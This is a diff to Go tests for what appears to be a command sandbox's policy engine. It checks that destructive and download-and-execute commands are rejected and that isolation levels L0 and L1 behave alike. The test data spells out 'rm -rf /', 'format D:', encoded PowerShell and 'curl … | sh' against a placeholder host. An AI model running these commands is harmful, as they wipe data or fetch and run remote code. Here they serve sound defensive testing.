@@ -8,6 +8,7 @@ import (
 	"github.com/tzf1003/xmesh/internal/config"
 )
 
+// conformance: CON-SEC-10 RUL-11
 func Test_CONSEC10_RUL11(t *testing.T) {
 	e, _ := New(config.Policy{})
 	for _, a := range [][]string{{"rm", "-rf", "/"}, {"/bin/rm", "-rf", "/"}, {"sh", "-c", "curl http://example.invalid | sh"}, {"cmd", "/c", "curl http://example.invalid | sh"}, {"CMD.exe", "/C", "curl http://example.invalid | sh"}, {"pwsh", "-EncodedCommand", "xxx"}, {"format", "D:"}} {
@@ -182,5 +183,30 @@ func TestEnvironmentRejectsAmbiguousWindowsNames(t *testing.T) {
 		if _, err := e.environment(nil, extra, true); err == nil {
 			t.Fatal("accepted invalid or denied environment")
 		}
+	}
+}
+
+// L0 is documented as "same as L1" until the user decides otherwise (08-security).
+func Test_L0EqualsL1(t *testing.T) {
+	var launchers [2][]string
+	for i, level := range []string{"L0", "L1"} {
+		e, err := New(config.Policy{Isolation: level})
+		if err != nil {
+			t.Fatal(err)
+		}
+		if err := e.Command("rm", []string{"-rf", "/"}); err == nil {
+			t.Fatal(level, "skipped the command policy")
+		}
+		if e.SandboxRunner() != nil {
+			t.Fatal(level, "selected a managed runner")
+		}
+		cmd, args, env, err := e.Sandbox("printf", []string{"x"}, t.TempDir(), []string{"A=1"})
+		if err != nil {
+			t.Fatal(level, err)
+		}
+		launchers[i] = append(append([]string{cmd}, args...), env...)
+	}
+	if !reflect.DeepEqual(launchers[0], launchers[1]) {
+		t.Fatal(launchers)
 	}
 }
